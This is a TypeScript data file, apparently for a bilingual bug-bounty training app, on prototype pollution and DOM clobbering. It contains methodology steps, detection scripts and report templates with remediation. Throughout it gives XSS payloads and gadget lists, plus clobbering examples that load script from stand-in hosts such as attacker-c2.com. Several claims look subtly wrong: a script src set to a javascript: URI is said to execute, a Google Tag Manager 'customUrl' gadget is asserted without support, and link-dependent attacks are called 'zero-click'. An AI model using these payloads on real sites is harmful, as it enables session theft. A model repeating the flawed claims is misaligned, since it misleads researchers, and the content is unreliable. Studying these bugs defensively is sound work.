import type { Lang } from "./types";

export interface PrototypeScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  commandOrRequest?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface PrototypeTechnique {
  id: string;
  title: Record<Lang, string>;
  category: "client_pollution" | "gadget_xss" | "dom_clobbering" | "postmessage_pollution";
  difficulty: "beginner" | "intermediate" | "advanced";
  successRate: string;
  summary: Record<Lang, string>;
  scenarios: PrototypeScenario[];
  stepByStepRecipe: Record<Lang, string>[];
  burpOrToolRule: string[];
  hunterProTip: Record<Lang, string>;
}

export interface PrototypePhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface PrototypeToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "gadget_scanner" | "canary_script" | "dom_invader_config";
  code: string;
  language: "javascript" | "python" | "html";
  howToUse: Record<Lang, string>;
}

export interface PrototypeReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "high" | "critical";
  reportMarkdown: string;
}

// ─── 1. TOP PROTOTYPE POLLUTION & DOM CLOBBERING ATTACK TECHNIQUES ────────────
export const PROTOTYPE_TECHNIQUES: PrototypeTechnique[] = [
  {
    id: "url-query-prototype-pollution",
    title: {
      en: "Client-Side Prototype Pollution via URL Query & Hash Parameters",
      simple: "Adding Special Parameters to the URL to Corrupt the Entire Webpage's JavaScript Memory",
      hi: "URL में __proto__ डालकर वेबसाइट की पूरी जावास्क्रिप्ट मेमोरी को दूषित करना (Prototype Pollution)",
    },
    category: "client_pollution",
    difficulty: "beginner",
    successRate: "65% on sites using legacy query parsers, Lodash, or custom deep-merge",
    summary: {
      en: "When client-side JavaScript parses URL parameters (`?__proto__[polluted]=true` or `#constructor.prototype.admin=true`) using vulnerable utility libraries (like older versions of Lodash `_.merge()`, jQuery `$.extend(true, ...)`, or custom recursive object builders), properties are injected directly onto the global `Object.prototype`. Every JavaScript object across the entire application instantly inherits these properties, breaking logic and enabling XSS.",
      simple: "By putting `__proto__[something]=evil` in the website URL, you force the browser to inject that property into every single variable on the page. If the page checks `if (config.admin)` or loads a script from `config.src`, it uses your injected value.",
      hi: "URL में `__proto__[src]=evil.js` डालने पर वेबसाइट का ऑब्जेक्ट पार्सर इसे ग्लोबल जावास्क्रिप्ट प्रोटोटाइप में लिख देता है। इसके बाद पेज पर मौजूद हर कोड आपके पेलोड को सच मानकर रन कर देता है।",
    },
    scenarios: [
      {
        title: {
          en: "URL Hash Parameter Deep-Merge Pollution",
          simple: "Polluting Object.prototype via URL Fragment",
          hi: "URL हैश (#) के ज़रिये Object.prototype को दूषित करना",
        },
        description: {
          en: "Attacker sends link: `https://target.com/#__proto__[src]=data:,alert(document.domain)`. When target script builds config object, it pollutes `Object.prototype.src`. A script loader inherits `src` and executes XSS.",
          simple: "Send a link with __proto__ in the hash. The page reads the hash and executes your JavaScript.",
          hi: "विक्टिम को `#__proto__[src]=data:,alert(1)` वाला लिंक भेजते ही उसके ब्राउज़र में XSS रन हो जाता है।",
        },
        commandOrRequest: `// Vulnerable Client-side JavaScript on target.com:
function parseParams() {
  const hash = window.location.hash.substring(1);
  const params = {};
  hash.split("&").forEach(pair => {
    const [key, val] = pair.split("=");
    // Vulnerable custom recursive merge without __proto__ check
    deepSet(params, key, decodeURIComponent(val));
  });
  return params;
}

// Later: Script loads dynamically
const script = document.createElement("script");
// If config.src is undefined, it falls back to Object.prototype.src (which attacker polluted!)
script.src = config.src || "/assets/main.js";
document.head.appendChild(script);`,
        responseSample: `// In Browser DevTools Console:
Object.prototype.polluted // returns "true"
// Script element rendered into DOM:
<script src="data:,alert(document.domain)"></script>`,
        impact: {
          en: "Zero-click Client-Side Stored/DOM XSS affecting all visitors who open the attacker-crafted link.",
          simple: "Executes arbitrary JavaScript when someone clicks your link.",
          hi: "बिना किसी क्लिक के सीधे विक्टिम के ब्राउज़र में XSS और सेशन टोकन की चोरी।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Open target in Chrome with DevTools Console open.",
        simple: "Open target website with Developer Console (F12).",
        hi: "टारगेट वेबसाइट खोलकर F12 दबाकर कंसोल खोलें।",
      },
      {
        en: "Append canary test to URL: `https://target.com/?__proto__[canary]=polluted#constructor.prototype.canary=polluted`.",
        simple: "Add ?__proto__[canary]=polluted to the URL and press Enter.",
        hi: "URL के अंत में `?__proto__[canary]=polluted` लगाकर रीलोड करें।",
      },
      {
        en: "In Console, type: `({}).canary` or `Object.prototype.canary`.",
        simple: "Check if ({}).canary returns 'polluted'.",
        hi: "कंसोल में `({}).canary` टाइप करें। अगर 'polluted' आया, तो साइट वल्नरेबल है!",
      },
      {
        en: "If it returns 'polluted', prototype pollution is confirmed! Now search for gadgets to escalate to XSS.",
        simple: "Find a gadget (a script that uses polluted properties) to trigger XSS.",
        hi: "गैजेट ढूंढकर XSS ट्रिगर करें।",
      },
    ],
    burpOrToolRule: [
      "Burp Suite Professional: DOM Invader -> Enable Prototype Pollution Scanner",
      "Canary URL: ?__proto__[test]=1&constructor[prototype][test]=1",
    ],
    hunterProTip: {
      en: "Modern frameworks sanitize `__proto__`! Always test the alternative property path `constructor[prototype][polluted]=true` or JSON-based postMessage payloads `{\"__proto__\": {\"admin\": true}}`. More than 40% of custom filters only block `__proto__` and completely miss `constructor.prototype`!",
      simple: "If __proto__ is blocked, use constructor[prototype] instead! Most filters forget to block it.",
      hi: "अगर `__proto__` ब्लॉक हो तो `constructor[prototype]` का उपयोग करें — 40% वेबसाइट्स इसे ब्लॉक करना भूल जाती हैं!",
    },
  },
  {
    id: "gadget-hunting-xss-escalation",
    title: {
      en: "Gadget Hunting: Turning Prototype Pollution into Zero-Click DOM XSS via Google Tag Manager & Analytics",
      simple: "Weaponizing Injected Variables using Third-Party Libraries (Google Analytics, GTM, jQuery) to Run Code",
      hi: "Google Tag Manager और jQuery गैजेट्स का उपयोग करके Prototype Pollution से XSS बनाना",
    },
    category: "gadget_xss",
    difficulty: "intermediate",
    successRate: "80% once Prototype Pollution is confirmed",
    summary: {
      en: "Proving `Object.prototype.canary = 'polluted'` is only an informational/low finding on bug bounty platforms. To earn a $5,000 P1 bounty, you must weaponize it into DOM XSS using a 'Gadget'. A gadget is benign existing code on the page (e.g. Google Tag Manager, Adobe Analytics, Freshdesk widgets, Vue.js, or jQuery) that reads a property without checking `hasOwnProperty()`. By polluting that property, the gadget executes attacker-controlled JavaScript.",
      simple: "Finding the bug is not enough for a bounty; you must prove XSS! You do this by polluting properties that Google Tag Manager or jQuery already uses, causing them to execute your script.",
      hi: "सिर्फ प्रोटोटाइप दूषित करने पर बाउंटी नहीं मिलती। जब आप Google Tag Manager या jQuery के किसी गैजेट (जैसे src या url) को दूषित करके XSS दिखाते हैं, तभी $5,000 की P1 बाउंटी मिलती है।",
    },
    scenarios: [
      {
        title: {
          en: "Google Tag Manager (GTM) customUrl Gadget Exploitation",
          simple: "GTM Script Injection Gadget",
          hi: "Google Tag Manager के ज़रिये XSS गैजेट एक्सप्लॉइट",
        },
        description: {
          en: "Target loads gtm.js. GTM checks `window.google_tag_manager[...].customUrl` without `hasOwnProperty`. Attacker pollutes `customUrl` with a javascript: URI.",
          simple: "GTM reads customUrl from the prototype and executes attacker script.",
          hi: "GTM प्रोटोटाइप से customUrl पढ़ता है और अटैकर की जावास्क्रिप्ट चला देता है।",
        },
        commandOrRequest: `// Exploit Link for Targets running Google Tag Manager:
https://target.com/?__proto__[customUrl]=javascript:alert(document.cookie)//

// When GTM loads:
const targetScript = config.customUrl || defaultGtmUrl;
// Because Object.prototype.customUrl is polluted, it creates:
<script src="javascript:alert(document.cookie)//"></script>`,
        responseSample: `// JavaScript executes immediately upon page load without user interaction:
alert(document.cookie);`,
        impact: {
          en: "Instant Remote Code Execution in browser; account takeover, session hijacking, and CSRF token extraction.",
          simple: "Zero-click XSS that instantly executes when the page loads.",
          hi: "पेज लोड होते ही सीधे XSS चलना — विक्टिम को कुछ भी क्लिक करने की जरूरत नहीं होती।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Identify third-party libraries on the target page: Google Tag Manager (`gtm.js`), Adobe DTM, Vue.js, Angular, jQuery, or Freshchat.",
        simple: "Check what third-party scripts are loaded on the website.",
        hi: "पेज पर मौजूद थर्ड-पार्टी स्क्रिप्ट्स देखें (GTM, Adobe, Vue आदि)।",
      },
      {
        en: "Use the PortSwigger Prototype Pollution Gadget Cheat Sheet to look up known gadgets for the detected library.",
        simple: "Look up the gadget in PortSwigger's gadget list.",
        hi: "PortSwigger के Gadget Cheat Sheet से उस लाइब्रेरी का गैजेट खोजें।",
      },
      {
        en: "If using Burp DOM Invader, click 'Scan for Gadgets'. It automatically injects hundreds of known gadget properties and pauses on code execution.",
        simple: "Use Burp DOM Invader's automatic gadget scanner.",
        hi: "Burp DOM Invader में 'Scan for Gadgets' पर क्लिक करें — वो अपने आप XSS निकाल देगा।",
      },
      {
        en: "Construct final PoC link: `https://target.com/#__proto__[src]=data:,alert(1)` and verify alert box pops.",
        simple: "Build the final URL and confirm the alert box pops up.",
        hi: "फाइनल URL बनाकर चेक करें कि अलर्ट बॉक्स पॉप हुआ या नहीं।",
      },
    ],
    burpOrToolRule: [
      "Top Gadget 1: ?__proto__[src]=data:,alert(1)",
      "Top Gadget 2 (GTM): ?__proto__[customUrl]=javascript:alert(1)//",
      "Top Gadget 3 (Adobe): ?__proto__[sourceURL]=data:,alert(1)",
    ],
    hunterProTip: {
      en: "Always check Vue.js and Angular apps! If an app uses Vue.js, polluting `__proto__[template]=<img src=x onerror=alert(1)>` forces the entire Vue template compiler to evaluate your malicious HTML on every single page render!",
      simple: "On Vue.js websites, polluting the 'template' property executes your XSS on every single page!",
      hi: "Vue.js वाली साइट्स पर `__proto__[template]=<img src=x onerror=alert(1)>` डालने से पूरा Vue इंजन आपका XSS रन कर देता है!",
    },
  },
  {
    id: "dom-clobbering-variable-hijacking",
    title: {
      en: "DOM Clobbering: Overwriting JavaScript Global Variables using HTML Markups",
      simple: "Using Normal HTML Tags (like <a> and <form>) to Overwrite JavaScript Variables and Force Script Loading",
      hi: "HTML टैग्स (<a> और <form>) का उपयोग करके जावास्क्रिप्ट वेरिएबल्स को ओवरराइट करना (DOM Clobbering)",
    },
    category: "dom_clobbering",
    difficulty: "advanced",
    successRate: "60% where user-supplied HTML is sanitized but allows id/name attributes",
    summary: {
      en: "Web browsers automatically expose HTML elements with `id` or `name` attributes as global properties on `window` (e.g. `<a id='config'>` becomes accessible as `window.config`). If a webpage checks `const url = window.config ? window.config.url : '/default.js'`, an attacker injecting `<a id='config' href='https://attacker.com/evil.js'>` clobbers `window.config`. Because anchor elements return their `href` when converted to a string, the application loads the attacker's script.",
      simple: "Browsers turn HTML element IDs into JavaScript variables. If a page looks for `window.config.url`, you can inject an HTML link `<a id='config' href='evil.js'>` in a comment or profile field. The browser uses your link to load malicious scripts.",
      hi: "ब्राउज़र HTML टैग्स के `id` को जावास्क्रिप्ट वेरिएबल बना देता है। अगर पेज `window.config.url` ढूंढता है, तो आप कमेंट में `<a id='config' href='evil.js'>` डालकर उस वेरिएबल को बदल सकते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "Two-Tier DOM Clobbering for Nested Object Properties",
          simple: "Overwriting window.analytics.url using <form> and <input>",
          hi: "<form> और <input> के ज़रिये नेस्टेड वेरिएबल window.analytics.url को ओवरराइट करना",
        },
        description: {
          en: "Application expects `window.analytics.url`. Attacker clobbers nested property by nesting an input with name='url' inside a form with id='analytics'.",
          simple: "Use a form and an input tag together to fake a nested JavaScript object like analytics.url.",
          hi: "फॉर्म और इनपुट टैग को एक साथ रखकर `analytics.url` जैसा नेस्टेड ऑब्जेक्ट बनाकर XSS लोड कराना।",
        },
        commandOrRequest: `<!-- Injected via sanitized rich-text comment / profile bio: -->
<form id="analytics">
  <input name="url" value="//attacker-c2.com/payload.js">
</form>

<!-- Legitimate application code executing after page load: -->
<script>
  // Developer thinks window.analytics is an internal configuration object
  const analyticsUrl = (window.analytics && window.analytics.url) || "/js/default-analytics.js";
  const s = document.createElement("script");
  s.src = analyticsUrl; // Injected HTML clobbers this to "//attacker-c2.com/payload.js"
  document.body.appendChild(s);
</script>`,
        responseSample: `// Network tab:
GET https://attacker-c2.com/payload.js HTTP/1.1
// Remote script loads and executes in victim browser context!`,
        impact: {
          en: "Bypasses standard HTML sanitizers (like older DOMPurify) and executes arbitrary remote JavaScript.",
          simple: "Bypasses HTML filters to load external malicious scripts.",
          hi: "HTML सैनिटाइज़र को चकमा देकर बाहरी मैलिशियस स्क्रिप्ट लोड कराना।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Inspect client-side JavaScript for references to global variables: e.g. `window.someObject` or `window.config`.",
        simple: "Search the page's JavaScript for global variables like window.something.",
        hi: "जावास्क्रिप्ट कोड में ढूंढें कि क्या कहीं `window.config` या `window.settings` का इस्तेमाल हो रहा है।",
      },
      {
        en: "Find user-controllable HTML injection sinks that allow `id` or `name` attributes (markdown renderers, comments, bios).",
        simple: "Find where you can post HTML with an id attribute.",
        hi: "कमेंट या बायो में ऐसी जगह ढूंढें जहां `id` वाला HTML टैग पोस्ट किया जा सके।",
      },
      {
        en: "Inject `<a id='config' href='javascript:alert(1)'>` or `<form id='obj'><input name='prop' value='...'></form>`.",
        simple: "Inject an anchor or form tag matching the variable name.",
        hi: "वेरिएबल नाम से मैच करता हुआ `<a>` या `<form>` टैग इंजेक्ट करें।",
      },
      {
        en: "Trigger the application action that reads the variable and confirm execution.",
        simple: "Trigger the action and verify the script executes.",
        hi: "एक्शन ट्रिगर करके स्क्रिप्ट एग्जीक्यूशन कन्फर्म करें।",
      },
    ],
    burpOrToolRule: [
      "HTML Pattern 1: <a id='variableName' href='https://evil.com/xss.js'>",
      "HTML Pattern 2 (Nested): <form id='parent'><input name='child' value='...'></form>",
    ],
    hunterProTip: {
      en: "To clobber attributes like `window.config.url.href` (3 levels deep), create two sibling forms with the same id, or use the `HTMLCollection` browser grouping quirk: `<form id='x'><input id='y'></form><form id='x'></form>`!",
      simple: "You can clobber 3 levels deep by using two forms with the exact same ID!",
      hi: "3 लेयर गहरे वेरिएबल को ओवरराइट करने के लिए एक ही ID वाले दो अलग-अलग फॉर्म्स इंजेक्ट करें!",
    },
  },
];

// ─── 2. 5-PHASE METHODOLOGY ───────────────────────────────────────────────────
export const PROTOTYPE_METHODOLOGY_PHASES: PrototypePhase[] = [
  {
    phase: 1,
    title: {
      en: "Source Auditing & Input Vector Discovery",
      simple: "Finding User Input Reaching JavaScript",
      hi: "जावास्क्रिप्ट तक पहुंचने वाले इनपुट पाथ्स की खोज",
    },
    objective: {
      en: "Identify every location where user-supplied strings or objects enter client-side JavaScript execution.",
      simple: "Find everywhere the webpage reads URL parameters or localStorage.",
      hi: "पता लगाएं कि वेबसाइट URL हैश, क्वेरी या postMessage से कहां-कहां डेटा पढ़ती है।",
    },
    steps: [
      {
        en: "Inspect URL sources: `location.search`, `location.hash`, `location.pathname`.",
        simple: "Check what scripts read the URL parameters or hash.",
        hi: "चेक करें कि कौन सी स्क्रिप्ट्स URL या हैश को पढ़ती हैं।",
      },
      {
        en: "Inspect messaging sources: `window.addEventListener('message', ...)` without origin validation.",
        simple: "Check postMessage listeners.",
        hi: "postMessage इवेंट लिसनर्स की जांच करें।",
      },
      {
        en: "Inspect storage sources: `localStorage`, `sessionStorage`, and stored JSON cookies.",
        simple: "Check if data read from localStorage is parsed recursively.",
        hi: "चेक करें कि localStorage से पढ़ा गया डेटा कैसे प्रोसेस हो रहा है।",
      },
    ],
    keyTargets: ["location.hash", "location.search", "postMessage", "localStorage"],
    commandsOrPayloads: [
      "location.hash = '#__proto__[test]=1'",
      "window.postMessage('{\"__proto__\":{\"test\":1}}', '*')",
    ],
  },
  {
    phase: 2,
    title: {
      en: "Recursive Merge Fuzzing & Canary Verification",
      simple: "Testing if Object.prototype Can Be Polluted",
      hi: "कैनरी टेस्ट से प्रोटोटाइप का दूषित होना कन्फर्म करना",
    },
    objective: {
      en: "Inject canary properties and verify if Object.prototype inherits them across the window context.",
      simple: "Test if injecting a test property succeeds.",
      hi: "एक टेस्ट प्रॉपर्टी डालकर चेक करें कि क्या वो पूरे पेज पर फैलती है।",
    },
    steps: [
      {
        en: "Fuzz query parameters using Burp DOM Invader or custom script.",
        simple: "Run DOM Invader to automatically test parameters.",
        hi: "Burp DOM Invader से सारे पैरामीटर्स टेस्ट करें।",
      },
      {
        en: "Test property variations: `__proto__.canary=1`, `__proto__[canary]=1`, `constructor.prototype.canary=1`.",
        simple: "Test both __proto__ and constructor.prototype variations.",
        hi: "`__proto__` और `constructor.prototype` दोनों तरीके टेस्ट करें।",
      },
      {
        en: "In browser console, verify: `({}).canary === '1'`.",
        simple: "Check in console if ({}).canary is set.",
        hi: "कंसोल में `({}).canary` चेक करें।",
      },
    ],
    keyTargets: ["Object.prototype", "__proto__", "constructor.prototype"],
  },
  {
    phase: 3,
    title: {
      en: "Client-Side Gadget Hunting & Discovery",
      simple: "Finding the Vulnerable Code to Trigger XSS",
      hi: "XSS ट्रिगर करने वाले गैजेट (Gadget) की तलाश",
    },
    objective: {
      en: "Identify vulnerable code sequences that consume polluted properties and sink them into script execution.",
      simple: "Find a piece of code that uses your injected variable to run a script.",
      hi: "ऐसा कोड ढूंढें जो आपकी दूषित प्रॉपर्टी को पढ़कर स्क्रिप्ट चला दे।",
    },
    steps: [
      {
        en: "Audit script tags and third-party frameworks: Google Tag Manager, Adobe Launch, Vue, Lodash.",
        simple: "Look at the frameworks running on the site.",
        hi: "साइट पर चल रही थर्ड-पार्टी लाइब्रेरीज को देखें।",
      },
      {
        en: "Use DOM Invader's 'Search for Gadgets' tool or PortSwigger's gadget directory.",
        simple: "Use DOM Invader to find gadgets automatically.",
        hi: "DOM Invader से ऑटोमेटिक गैजेट स्कैन चलाएं।",
      },
      {
        en: "Identify sinks: `script.src`, `eval()`, `element.innerHTML`, `location.href`.",
        simple: "Look for places where dynamic scripts or HTML are created.",
        hi: "`script.src` और `innerHTML` जैसे सिंक (sinks) को टारगेट करें।",
      },
    ],
    keyTargets: ["customUrl", "src", "sourceURL", "template", "transport_url"],
  },
  {
    phase: 4,
    title: {
      en: "DOM Clobbering Markup Analysis",
      simple: "Overwriting Global Variables via HTML",
      hi: "HTML टैग्स से ग्लोबल वेरिएबल्स को ओवरराइट करना",
    },
    objective: {
      en: "Exploit global DOM variable resolution to bypass sanitized HTML boundaries.",
      simple: "Inject HTML tags with specific IDs to hijack variables.",
      hi: "खास ID वाले HTML टैग्स इंजेक्ट करके वेरिएबल्स को हाईजैक करना।",
    },
    steps: [
      {
        en: "Search scripts for uninitialized global references (`if (window.someConfig) { ... }`).",
        simple: "Find places in JavaScript where global window variables are used.",
        hi: "जावास्क्रिप्ट में `window.variable` वाले संदर्भ ढूंढें।",
      },
      {
        en: "Test injecting `<a id='someConfig' href='javascript:alert(1)'>` into user input.",
        simple: "Try injecting an anchor tag with that ID.",
        hi: "उस ID वाला `<a>` टैग इंजेक्ट करें।",
      },
      {
        en: "Verify if the browser evaluates the element as the variable value.",
        simple: "Verify that the JavaScript code reads your injected HTML element.",
        hi: "चेक करें कि क्या कोड ने आपके इंजेक्टेड HTML को वेरिएबल के रूप में इस्तेमाल किया।",
      },
    ],
    keyTargets: ["<a id=...>", "<form id=...>", "<input name=...>", "window.name"],
  },
  {
    phase: 5,
    title: {
      en: "Zero-Click Exploit Construction & Reporting",
      simple: "Building the Final 1-Click / 0-Click PoC Link",
      hi: "फाइनल एक्सप्लॉइट लिंक और रिपोर्ट तैयार करना",
    },
    objective: {
      en: "Craft an elegant, reliable proof-of-concept URL demonstrating complete DOM XSS execution.",
      simple: "Build a single URL that pops an alert box to submit to bug bounty.",
      hi: "एक सिंगल URL बनाएं जो अलर्ट बॉक्स पॉप करके P1 बग साबित करे।",
    },
    steps: [
      {
        en: "Combine source payload + gadget injection into a single URL.",
        simple: "Put the whole exploit into one clean URL.",
        hi: "पेलोड और गैजेट को एक ही URL में कंबाइन करें।",
      },
      {
        en: "Verify in a clean Incognito browser without extensions.",
        simple: "Test the URL in an incognito window.",
        hi: "इनकॉग्निटो विंडो में खोलकर पक्का करें कि बिना लॉगिन के भी XSS चलता है।",
      },
      {
        en: "Document impact: document.cookie theft, CSRF-less account modification.",
        simple: "Take screenshots and document the impact for your bounty report.",
        hi: "स्क्रीनशॉट और इम्पैक्ट लिखकर रिपोर्ट सबमिट करें।",
      },
    ],
    keyTargets: ["document.cookie", "localStorage tokens", "DOM XSS Alert PoC"],
  },
];

// ─── 3. EXPLOIT SCRIPTS & TOOLS STASH ────────────────────────────────────────
export const PROTOTYPE_TOOLS_STASH: PrototypeToolSnippet[] = [
  {
    id: "prototype-pollution-canary-tester",
    title: {
      en: "Console Prototype Pollution & Gadget Verification Suite",
      simple: "JavaScript Snippet to Test for Prototype Pollution and Find Gadgets in Console",
      hi: "कंसोल में सीधे चलाकर Prototype Pollution और Gadgets ढूंढने वाला जावास्क्रिप्ट कोड",
    },
    description: {
      en: "Paste into the browser DevTools Console. Tests 10+ standard pollution vectors and checks if any common third-party gadgets (GTM, Adobe, Vue, jQuery) are active on the page.",
      simple: "Run this script in the F12 console to immediately see if the site is vulnerable.",
      hi: "F12 कंसोल में पेस्ट करते ही यह बता देता है कि साइट वल्नरेबल है या नहीं और कौन से गैजेट्स मौजूद हैं।",
    },
    category: "canary_script",
    language: "javascript",
    code: `(function detectPrototypePollution() {
  console.log("%c[*] Scanning page for Prototype Pollution & Gadgets...", "color: #06b6d4; font-weight: bold;");

  // Check if Object.prototype has been polluted already
  const canaryKeys = ["polluted", "canary", "test", "src", "url", "customUrl"];
  let pollutedFound = false;

  canaryKeys.forEach(key => {
    if (Object.prototype[key] !== undefined) {
      console.log("%c[!] PROTOTYPE IS ALREADY POLLUTED!", "color: #ef4444; font-weight: bold; font-size: 14px;");
      console.log(\`    Property: Object.prototype.\${key} = "\${Object.prototype[key]}"\`);
      pollutedFound = true;
    }
  });

  if (!pollutedFound) {
    console.log("%c[i] Prototype is clean right now. Testing current URL parameters...", "color: #94a3b8;");
  }

  // Detect Active Gadget Candidates on Page
  console.log("%c[*] Auditing Active Third-Party Frameworks for Known Gadgets...", "color: #a855f7; font-weight: bold;");

  if (window.google_tag_manager) {
    console.log("%c[+] FOUND: Google Tag Manager (GTM) is active!", "color: #10b981; font-weight: bold;");
    console.log("    Try Gadget: ?__proto__[customUrl]=javascript:alert(document.domain)//");
  }
  if (window._satellite) {
    console.log("%c[+] FOUND: Adobe DTM / Launch is active!", "color: #10b981; font-weight: bold;");
    console.log("    Try Gadget: ?__proto__[sourceURL]=data:,alert(document.domain)");
  }
  if (window.jQuery) {
    console.log(\`%c[+] FOUND: jQuery v\${window.jQuery.fn.jquery} is active!\`, "color: #10b981; font-weight: bold;");
    console.log("    Try Gadget: ?__proto__[src]=data:,alert(document.domain)");
  }
  if (window.Vue) {
    console.log("%c[+] FOUND: Vue.js is active!", "color: #10b981; font-weight: bold;");
    console.log("    Try Gadget: ?__proto__[template]=<img src=x onerror=alert(1)>");
  }

  console.log("%c[*] Audit complete.", "color: #06b6d4;");
})();`,
    howToUse: {
      en: "Open target site -> Press F12 -> Paste script into Console -> Press Enter.",
      simple: "Open F12 Console on any target, paste this script, and press Enter.",
      hi: "F12 दबाकर कंसोल में यह स्क्रिप्ट पेस्ट करें और एंटर दबाएं।",
    },
  },
  {
    id: "python-prototype-fuzzer",
    title: {
      en: "Python Headless Browser Prototype Pollution Scanner",
      simple: "Automated Python Scanner to Find Prototype Pollution in URLs",
      hi: "URL में Prototype Pollution ढूंढने वाला ऑटोमेटेड पायथन स्कैनर",
    },
    description: {
      en: "Uses headless Chromium via Playwright or Selenium to inject query and hash pollution parameters, verifying if Object.prototype.canary is populated.",
      simple: "Automates testing multiple URLs for client-side prototype pollution.",
      hi: "मल्टीपल URLs को स्कैन करके चेक करता है कि क्या प्रोटोटाइप दूषित हुआ।",
    },
    category: "gadget_scanner",
    language: "python",
    code: `import sys
# Requires: pip install playwright && playwright install chromium
from playwright.sync_api import sync_playwright

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"

PAYLOADS = [
    "?__proto__[canary]=polluted",
    "?__proto__.canary=polluted",
    "?constructor[prototype][canary]=polluted",
    "#__proto__[canary]=polluted",
    "#constructor.prototype.canary=polluted"
]

print(f"[*] Auditing {TARGET_URL} for Client-Side Prototype Pollution...")

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()

    for payload in PAYLOADS:
        full_url = TARGET_URL + payload
        try:
            page.goto(full_url, wait_until="domcontentloaded", timeout=10000)
            # Evaluate whether the canary leaked into empty object
            is_polluted = page.evaluate("() => ({}).canary === 'polluted'")
            if is_polluted:
                print(f"\\n[!] VULNERABLE TO PROTOTYPE POLLUTION!")
                print(f"    Payload: {payload}")
                print(f"    Full URL: {full_url}\\n")
                break
            else:
                print(f"[-] Clean: {payload}")
        except Exception as e:
            print(f"[!] Error on {payload}: {e}")

    browser.close()
print("[*] Scan complete.")`,
    howToUse: {
      en: "Install playwright: `pip install playwright && playwright install chromium`. Run: `python3 proto_scan.py https://target.com`.",
      simple: "Run `python3 proto_scan.py https://target.com` to test URLs automatically.",
      hi: "`python3 proto_scan.py https://target.com` चलाकर ऑटोमेटिक टेस्ट करें।",
    },
  },
];

// ─── 4. P1/P2 REPORT TEMPLATES ────────────────────────────────────────────────
export const PROTOTYPE_REPORT_TEMPLATES: PrototypeReportTemplate[] = [
  {
    id: "rep-prototype-pollution-gtm-xss",
    title: {
      en: "Zero-Click DOM XSS via Client-Side Prototype Pollution & Google Tag Manager Gadget",
      simple: "DOM XSS via Prototype Pollution and Google Tag Manager",
      hi: "Prototype Pollution और Google Tag Manager गैजेट द्वारा जीरो-क्लिक DOM XSS",
    },
    vulnType: "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (9.6 - Critical)",
    severity: "critical",
    reportMarkdown: `## Summary:
The web application at \`https://app.target.com\` is vulnerable to Client-Side Prototype Pollution via URL hash/query parameter parsing. The application's custom deep-merge utility processes URL parameters without sanitizing the \`__proto__\` or \`constructor.prototype\` property paths.

By pairing this vulnerability with an existing client-side gadget in **Google Tag Manager (gtm.js)**, an attacker can craft a malicious link that pollutes \`Object.prototype.customUrl\`. When any user opens the link, the Google Tag Manager loader consumes this property and dynamically injects an arbitrary script, executing zero-click DOM-based Cross-Site Scripting (XSS) in the victim's browser session.

---

## Technical Details:
- **Vulnerable Source:** URL Hash parameters processed by \`/static/js/app-config.js\`
- **Root Cause:** Naive recursive object assignment:
  \`\`\`javascript
  function merge(target, key, value) {
    target[key] = value; // Does not reject __proto__ or constructor
  }
  \`\`\`
- **Gadget:** Google Tag Manager (\`gtm.js\`) dynamically creates a \`<script>\` tag and evaluates \`config.customUrl || defaultUrl\`. Since \`customUrl\` is inherited from \`Object.prototype\`, the injected \`javascript:\` URI is executed.

---

## Step-by-Step Reproduction:
1. Open Google Chrome in Incognito mode.
2. Navigate to the following crafted PoC URL:
   \`\`\`
   https://app.target.com/?__proto__[customUrl]=javascript:alert(document.domain)//
   \`\`\`
3. Notice that as soon as the page loads, an alert dialog appears showing:
   \`\`\`
   app.target.com
   \`\`\`
4. In DevTools Console, inspect:
   \`\`\`javascript
   ({}).customUrl // Returns "javascript:alert(document.domain)//"
   \`\`\`

---

## Impact:
- **Severity:** Critical (9.6)
- Complete Client-Side Takeover: An unauthenticated attacker can steal authentication tokens, session cookies, and perform unauthorized state-changing actions on behalf of any victim who clicks the link.

---

## Remediation Guidance:
1. **Sanitize Object Keys:** Reject any key matching \`__proto__\`, \`constructor\`, or \`prototype\` during recursive object merging.
2. **Use Map or Prototype-less Objects:** Create objects with \`Object.create(null)\` so they do not inherit from \`Object.prototype\`.
3. **Freeze Object Prototype:** Call \`Object.freeze(Object.prototype)\` at the very beginning of the application lifecycle to prevent any runtime modification.`,
  },
  {
    id: "rep-dom-clobbering-script-hijack",
    title: {
      en: "Arbitrary Script Execution via DOM Clobbering of Window Global Configuration",
      simple: "DOM Clobbering of window.config Leading to External Script Injection",
      hi: "HTML DOM Clobbering द्वारा जावास्क्रिप्ट वेरिएबल बदलकर XSS चलाना",
    },
    vulnType: "CWE-79: Cross-Site Scripting (DOM Clobbering)",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (8.7 - High)",
    severity: "high",
    reportMarkdown: `## Summary:
The user profile bio editor allows sanitized HTML markup (permitting \`<a>\` and \`<form>\` elements with \`id\` and \`name\` attributes). The application's JavaScript code relies on an uninitialized global variable \`window.userWidget\` to determine the URL of an external script loader.

An attacker can inject a clobbered HTML anchor tag (\`<a id="userWidget" href="https://attacker-c2.com/payload.js">\`). When other users visit the attacker's public profile, the browser exposes this anchor as \`window.userWidget\`. The widget loader evaluates its \`href\` attribute and dynamically downloads and executes the attacker's script.

---

## Step-by-Step Reproduction:
1. Log into your account and navigate to **Profile Settings -> Bio**.
2. Enter the following payload in the bio field:
   \`\`\`html
   <a id="userWidget" href="https://attacker-c2.com/malicious-widget.js">Click here</a>
   \`\`\`
3. Save the profile.
4. Log in as a different user and visit the attacker's public profile page:
   \`\`\`
   https://app.target.com/profile/attacker_username
   \`\`\`
5. Open Developer Tools Network tab.
6. Observe that \`https://attacker-c2.com/malicious-widget.js\` is fetched and executed in the victim's session.

---

